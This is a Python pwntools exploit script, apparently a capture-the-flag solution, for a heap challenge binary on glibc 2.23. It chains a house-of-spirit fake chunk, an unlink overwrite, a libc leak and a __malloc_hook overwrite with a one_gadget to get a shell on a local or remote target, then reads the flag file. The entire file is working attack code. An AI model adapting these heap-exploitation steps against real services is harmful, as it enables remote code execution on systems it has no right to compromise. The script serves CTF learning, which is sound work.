#-*- coding: utf-8 -*-
from pwn import *


__author__ = '3summer'
binary_file = './pwn'
context.binary = binary_file
context.terminal = ['tmux', 'sp', '-h']
elf = ELF(binary_file)
libc = elf.libc
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
libc.symbols['one_gadget'] = one_gadgets[3]
context.log_level = 'debug'

def dbg(breakpoint):
    glibc_dir = '/usr/src/glibc/glibc-2.23/'
    gdbscript = 'directory %smalloc\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdbscript += 'c\n'
    log.info(gdbscript)
    gdb.attach(io, gdbscript)
    time.sleep(1)


def exploit(io): 
    r = lambda x: io.recv(x)
    ru = lambda x: io.recvuntil(x, drop = True)
    s = lambda x,y: io.sendafter(x,y)
    sl = lambda x,y: io.sendlineafter(x,y)
    
    def add(size,cnt):
        sl(">> ",str(1))
        sl("size\n",str(size))
        s("content\n",cnt)

    def add_no_output(size,cnt):
        io.sendline(str(1))
        io.send(str(size).ljust(0x8,'\x00'))
        io.send(cnt)

    def dele():
        sl(">> ",str(2))

    def dele_no_output():
        io.sendline(str(2))

    def show():
        sl(">> ",str(3))

    def gift(choice,cnt=""):
        sl(">> ",str(666))
        s("free?",str(choice))
        if choice==1:
            s("content\n",cnt)

    # house of spirit
    s("username:",3*p64(0)+p64(0x41))
    s("info",3*p64(0)+p64(0x20e21))

    add(0x38,'\0'*0x38)
    dele()
    add(0x48,'\0'*0x48)
    dele()
    add(0x28,'\0'*0x28)
    dele()
    add(0x18,'\0'*0x18)
    dele()
    add(0x68,'\0'*0x30+p64(0)+p64(0x21)+"\0"*0x10+p64(0x20)+p64(0x101))
    dele()

    add(0x80,'\x00'*0x80)
    add(0x28,'\0'*0x28)
    dele()

    sl(">> ",'1'*0x400)

    payload = 2*p64(0)
    payload += p64(0x602098-0x18)+p64(0x602098-0x10)
    payload = payload.ljust(0x80,'\0')
    payload += p64(0x80)+p64(0x90)

    gift(1,cnt=payload)
    dele()
    gift(2)

    add(0x38,p64(0)+p64(0x602080)+p64(0xdeadbeefdeadbeef))
    dele()
    add(0x68,'A'*0x10)
    show()
    ru("A"*0x10)

    libc.address= u64(ru("\n").ljust(0x8,'\x00'))-0x3c4b78
    log.info("libc.address:"+hex(libc.address))
    __malloc_hook = libc.sym['__malloc_hook']
    system = libc.sym['system']

    dele_no_output()
    add_no_output(0x80,'\0'*0x80)
    add_no_output(0x18,p64(0)+p64(0x71)+p64(__malloc_hook-0x23))
    add_no_output(0x68,'\0'*0x68)
    add_no_output(0x68,"\0"*(0x13-8)+p64(libc.sym.one_gadget)+ p64(libc.sym.__libc_realloc+2)+'\n')

    io.sendline('\x00'*0x500)
    io.sendline("cat /flag >&0")

    return io


if __name__ == '__main__':
    if len(sys.argv) > 1:
        io = remote(sys.argv[1], sys.argv[2])
    else:
        io = process(binary_file, 0)
    exploit(io)
    io.interactive()

